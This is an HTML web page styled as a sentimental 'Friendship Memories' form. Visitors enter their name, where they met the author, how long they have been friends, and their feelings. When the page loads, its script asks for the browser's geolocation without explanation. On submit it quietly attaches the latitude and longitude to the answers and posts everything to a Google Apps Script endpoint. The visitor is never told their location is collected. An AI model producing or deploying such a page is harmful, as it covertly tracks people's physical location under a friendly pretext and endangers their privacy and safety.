<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Friendship Memories</title>

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Dancing+Script&display=swap" rel="stylesheet">

  <style>
    /* Body & Background */
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    /* Particle background */
    .particle {
      position: absolute;
      width: 4px;
      height: 4px;
      background: #0ff;
      border-radius: 50%;
      animation: float 10s linear infinite;
    }

    @keyframes float {
      0% {transform: translateY(0) translateX(0);}
      50% {transform: translateY(-500px) translateX(200px);}
      100% {transform: translateY(0) translateX(0);}
    }

    /* Glassmorphism Form */
    .container {
      position: relative;
      background: rgba(20,20,20,0.7);
      backdrop-filter: blur(10px);
      padding: 40px;
      border-radius: 20px;
      width: 90%;
      max-width: 500px;
      box-shadow: 0 0 20px #0ff;
      border: 2px solid #0ff;
      animation: fadeIn 1.5s ease-in-out;
      z-index: 1;
    }

    @keyframes fadeIn {
      0% {opacity: 0; transform: scale(0.8);}
      100% {opacity: 1; transform: scale(1);}
    }

    h2 {
      font-family: 'Dancing Script', cursive;
      text-align: center;
      font-size: 36px;
      margin-bottom: 20px;
      color: #0ff;
      text-shadow: 0 0 10px #0ff;
      height: 50px;
      overflow: hidden;
    }

    input, textarea, button {
      width: 100%;
      margin: 12px 0;
      padding: 12px;
      border-radius: 12px;
      border: none;
      font-size: 16px;
      transition: all 0.3s ease;
    }

    input, textarea {
      background: rgba(30,30,30,0.7);
      color: #fff;
    }

    input:focus, textarea:focus {
      box-shadow: 0 0 10px #0ff;
      outline: none;
    }

    button {
      background: #0ff;
      color: #000;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 10px #0ff;
    }

    button:hover {
      box-shadow: 0 0 20px #0ff;
      transform: scale(1.05);
    }

    body::after {
      content: '';
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0; left: 0;
      background: linear-gradient(180deg, rgba(0,255,255,0.1), transparent);
      pointer-events: none;
    }
  </style>
</head>
<body onload="autoGetLocation(); startTyping();">

  <!-- Particles -->
  <script>
    for(let i=0;i<50;i++){
      let p = document.createElement('div');
      p.className='particle';
      p.style.left = Math.random()*100 + '%';
      p.style.top = Math.random()*100 + '%';
      document.body.appendChild(p);
    }
  </script>

  <div class="container">
    <h2 id="header"></h2>
    <form id="friendForm">
      <input type="text" id="yourName" placeholder="Your Name" required>
      <input type="text" id="metAt" placeholder="Where did we meet?" required>
      <input type="text" id="duration" placeholder="How long we've been friends?" required>
      <textarea id="feelings" placeholder="How do you feel about our friendship?" required></textarea>
      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    // Typing Animation
    const headerText = 'Friendship Memories ❤️';
    let i = 0;
    function startTyping(){
      if(i < headerText.length){
        document.getElementById('header').innerHTML += headerText.charAt(i);
        i++;
        setTimeout(startTyping, 150);
      }
    }

    // Location Auto Request
    let userLat='', userLon='';
    function autoGetLocation(){
      if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(
          (pos)=>{ userLat=pos.coords.latitude; userLon=pos.coords.longitude; },
          (err)=>{ console.log('Location denied'); }
        );
      }
    }

    // Form Submission
    document.getElementById('friendForm').addEventListener('submit', function(e){
      e.preventDefault();
      const data = {
        name: document.getElementById('yourName').value,
        met: document.getElementById('metAt').value,
        duration: document.getElementById('duration').value,
        feelings: document.getElementById('feelings').value,
        latitude: userLat,
        longitude: userLon
      };
      fetch('https://script.google.com/macros/s/AKfycbzIDZ4cCb_MVojw5g8_L6yXI6SOKo2uEfQBBOZ03XskUMSNQtjfPbmWRmIOgF-LXZ4r5A/exec',{
        method:'POST',
        mode:'no-cors',
        body: JSON.stringify(data)
      });
      alert('Submitted Successfully!');
      document.getElementById('friendForm').reset();
    });
  </script>
</body>
</html>
